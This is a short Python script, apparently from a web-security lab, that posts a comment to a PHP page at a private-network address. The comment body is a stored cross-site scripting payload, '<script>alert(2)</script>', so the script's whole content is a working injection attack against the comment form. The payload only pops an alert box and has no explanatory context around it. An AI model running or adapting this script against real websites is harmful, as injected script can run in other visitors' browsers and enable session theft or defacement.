import requests


uri= "http://172.16.113.150/post_comment.php?id=2"
#r=request.get("http://172.16.113.150")
payload ={'title':'Confuse', 'author':'nyanyi','text':'<script>alert(2)</script>','submit':'submit'}
r=requests.post(uri, data=payload)
print(r.url)
